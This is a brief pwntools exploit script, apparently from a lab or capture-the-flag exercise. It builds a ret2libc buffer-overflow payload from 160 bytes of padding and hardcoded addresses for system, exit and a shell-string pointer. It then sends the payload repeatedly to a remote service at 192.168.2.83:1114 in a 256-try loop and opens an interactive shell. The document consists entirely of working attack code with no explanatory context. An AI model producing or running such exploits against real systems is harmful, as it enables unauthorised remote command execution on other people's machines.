from pwn import *

junk = "A" * 160
system = 0x08048420
exit = 0xf7e1a060
bin = 0xf7f6588f
in_str =  junk + p32(system) + p32(exit) + p32(bin)

for i in range (256):
    
    p = remote("192.168.2.83", "1114")
    p.sendline(in_str)
    p.interactive()